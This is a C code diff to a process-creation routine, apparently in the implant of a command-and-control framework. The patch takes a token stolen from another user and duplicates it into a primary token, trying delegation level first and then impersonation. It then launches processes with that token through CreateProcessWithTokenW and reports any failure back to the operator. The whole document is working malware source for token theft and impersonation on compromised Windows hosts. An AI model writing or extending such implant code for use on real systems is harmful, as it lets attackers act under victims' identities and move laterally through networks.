@@ -591,6 +591,7 @@ BOOL ProcessCreate(
     BOOL            Return             = TRUE;
     PVOID           Wow64Value         = NULL;
     BOOL            DisabledWow64Redir = FALSE;
+    HANDLE          pToken             = NULL;
 
     StartUpInfo.cb          = sizeof( STARTUPINFOA );
     StartUpInfo.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
@@ -653,9 +654,22 @@ BOOL ProcessCreate(
 
         if ( Instance.Tokens.Token->Type == TOKEN_TYPE_STOLEN )
         {
+            // Duplicate to make primary token (try delegation first)
+            if ( ! SysDuplicateTokenEx( Instance.Tokens.Token->Handle, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &pToken ) )
+            {
+                if ( ! SysDuplicateTokenEx( Instance.Tokens.Token->Handle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &pToken ) )
+                {
+                    PRINTF( "Failed to duplicate token [%d]\n", NtGetLastError() );
+                    TokenImpersonate( TRUE );
+                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                    Return = FALSE;
+                    goto Cleanup;
+                }
+            }
+
             PUTS( "CreateProcessWithTokenW" )
             if ( ! Instance.Win32.CreateProcessWithTokenW(
-                    Instance.Tokens.Token->Handle,
+                    pToken,
                     LOGON_NETCREDENTIALS_ONLY,
                     App,
                     CmdLine,
@@ -760,6 +774,10 @@ BOOL ProcessCreate(
 
     if ( Piped ) {
         JobAdd( Instance.CurrentRequestID, ProcessInfo->dwProcessId, JOB_TYPE_TRACK_PROCESS, JOB_STATE_RUNNING, ProcessInfo->hProcess, AnonPipe );
+    }
+
+    if ( pToken ) {
+        SysNtClose( pToken );
     }
 
     Cleanup:
